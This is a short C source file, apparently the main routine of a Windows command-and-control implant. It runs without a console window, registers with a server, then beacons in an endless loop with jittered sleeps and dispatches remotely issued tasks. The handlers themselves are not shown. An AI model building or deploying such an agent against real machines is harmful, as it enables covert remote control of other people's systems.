#include <windows.h>
#include "config.h"
#include "transport.h"
#include "commands.h"

// Entry point: no console window (-mwindows)
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Registration loop: retry every 30 s until success
    while (!agent_register()) {
        Sleep(30000);
    }

    // Beacon loop
    for (;;) {
        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);
        Sleep(sleep_ms_jitter());
    }
}
